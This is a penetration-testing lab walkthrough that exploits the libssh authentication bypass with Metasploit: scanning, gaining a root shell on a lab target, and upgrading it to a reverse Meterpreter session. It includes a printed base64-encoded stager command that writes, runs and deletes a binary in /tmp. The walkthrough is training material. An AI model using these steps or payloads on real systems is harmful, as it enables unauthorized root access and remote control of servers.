- SSH (Secure Shell) is a remote administration protocol that offers encryption and is the successor to Telnet.
- It is typically used for remote access to servers and systems.
- SSH uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port.
- libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side.
- libssh V0.6.0-0.8.0 is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.

```
root@attackdefense:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.6  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:06  txqueuelen 0  (Ethernet)
        RX packets 118  bytes 10551 (10.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 94  bytes 312642 (305.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.209.236.2  netmask 255.255.255.0  broadcast 192.209.236.255
        ether 02:42:c0:d1:ec:02  txqueuelen 0  (Ethernet)
        RX packets 18  bytes 1556 (1.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 18  bytes 1656 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1656 (1.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
root@attackdefense:~# ping -c 5 192.209.236.3
PING 192.209.236.3 (192.209.236.3) 56(84) bytes of data.
64 bytes from 192.209.236.3: icmp_seq=1 ttl=64 time=0.077 ms
64 bytes from 192.209.236.3: icmp_seq=2 ttl=64 time=0.046 ms
64 bytes from 192.209.236.3: icmp_seq=3 ttl=64 time=0.055 ms
64 bytes from 192.209.236.3: icmp_seq=4 ttl=64 time=0.050 ms
64 bytes from 192.209.236.3: icmp_seq=5 ttl=64 time=0.039 ms

--- 192.209.236.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 99ms
rtt min/avg/max/mdev = 0.039/0.053/0.077/0.014 ms
```

```
root@attackdefense:~# service postgresql status
11/main (port 5432): down
root@attackdefense:~# service postgresql start
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole
       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
msf5 > workspace -a libssh
[*] Added workspace: libssh
[*] Workspace: libssh
msf5 > setg RHOSTS 192.209.236.3
RHOSTS => 192.209.236.3
msf5 > setg RHOST 192.209.236.3
RHOST => 192.209.236.3
```

```
msf5 > db_nmap -sS -sV -O 192.209.236.3
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-08-03 15:24 UTC
[*] Nmap: Nmap scan report for target-1 (192.209.236.3)
[*] Nmap: Host is up (0.000032s latency).
[*] Nmap: Not shown: 999 closed ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 22/tcp open  ssh     (protocol 2.0)
[*] Nmap: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
[*] Nmap: SF-Port22-TCP:V=7.70%I=7%D=8/3%Time=64CBC69E%P=x86_64-pc-linux-gnu%r(NULL,
[*] Nmap: SF:16,"SSH-2\.0-libssh_0\.8\.3\r\n");
[*] Nmap: MAC Address: 02:42:C0:D1:EC:03 (Unknown)
[*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
[*] Nmap: TCP/IP fingerprint:
[*] Nmap: OS:SCAN(V=7.70%E=4%D=8/3%OT=22%CT=1%CU=31833%PV=N%DS=1%DC=D%G=Y%M=0242C0%TM
[*] Nmap: OS:=64CBC6A9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%
[*] Nmap: OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
[*] Nmap: OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
[*] Nmap: OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
[*] Nmap: OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
[*] Nmap: OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
[*] Nmap: OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
[*] Nmap: OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
[*] Nmap: OS:%T=40%CD=S)
[*] Nmap: Network Distance: 1 hop
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.07 seconds
```

```
msf5 > search libssh

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   1  auxiliary/scanner/ssh/libssh_auth_bypass  2018-10-16       normal  Yes    libssh Authentication Bypass Scanner


msf5 > use auxiliary/scanner/ssh/libssh_auth_bypass
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > options

Module options (auxiliary/scanner/ssh/libssh_auth_bypass):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_BANNER  true             no        Check banner for libssh
   CMD                            no        Command or alternative shell
   RHOSTS        192.209.236.3    yes       The target address range or CIDR identifier
   RPORT         22               yes       The target port
   SPAWN_PTY     false            no        Spawn a PTY
   THREADS       1                yes       The number of concurrent threads


Auxiliary action:

   Name   Description
   ----   -----------
   Shell  Spawn a shell


msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > set spawn_pty true 
spawn_pty => true
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > run

[*] 192.209.236.3:22 - Attempting authentication bypass
[*] Command shell session 1 opened (192.209.236.2:46667 -> 192.209.236.3:22) at 2023-08-03 15:25:37 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions

Active sessions
===============

  Id  Name  Type   Information                                                  Connection
  --  ----  ----   -----------                                                  ----------
  1         shell   libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.209.236.2:46667 -> 192.209.236.3:22 (192.209.236.3)

msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   1  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > sessions 1
[*] Starting interaction with 1...

[root@victim-1 /]# whoami
whoami
root
[root@victim-1 /]# ^Z
Background session 1? [y/N]  y
msf5 auxiliary(scanner/ssh/libssh_auth_bypass) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set lhost eth1
lhost => 192.209.236.2
msf5 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf5 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.209.236.2:4433 
[*] Sending stage (985320 bytes) to 192.209.236.3
[*] Meterpreter session 2 opened (192.209.236.2:4433 -> 192.209.236.3:47322) at 2023-08-03 15:26:59 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towNHsAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/BsVar.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/zklZe' < '/tmp/BsVar.b64' ; chmod +x '/tmp/zklZe' ; '/tmp/zklZe' & sleep 2 ; rm -f '/tmp/zklZe' ; rm -f '/tmp/BsVar.b64'"
[-] Output: "[1] 19"
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                  Connection
  --  ----  ----                   -----------                                                  ----------
  1         shell                  libssh Authentication Bypass Scanner (SSH-2.0-libssh_0.8.3)  192.209.236.2:46667 -> 192.209.236.3:22 (192.209.236.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.209.236.3                 192.209.236.2:4433 -> 192.209.236.3:47322 (192.209.236.3)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > ls
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2023-08-03 15:17:18 +0000  .dockerenv
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:43 +0000  bin
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:20 +0000  boot
40755/rwxr-xr-x   340   dir   2023-08-03 15:17:18 +0000  dev
40755/rwxr-xr-x   4096  dir   2023-08-03 15:17:18 +0000  etc
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:19 +0000  home
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:43 +0000  lib
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:43 +0000  lib64
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:19 +0000  mnt
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:19 +0000  opt
40555/r-xr-xr-x   0     dir   2023-08-03 15:17:18 +0000  proc
40750/rwxr-x---   4096  dir   2021-11-13 12:50:43 +0000  root
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:20 +0000  run
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:43 +0000  sbin
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:19 +0000  srv
40555/r-xr-xr-x   0     dir   2023-08-03 15:17:18 +0000  sys
41777/rwxrwxrwx   4096  dir   2023-08-03 15:27:01 +0000  tmp
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:43 +0000  usr
40755/rwxr-xr-x   4096  dir   2021-11-13 12:50:43 +0000  var

meterpreter > sysinfo
Computer     : 192.209.236.3
OS           :  (Linux 5.4.0-152-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > cd /
```

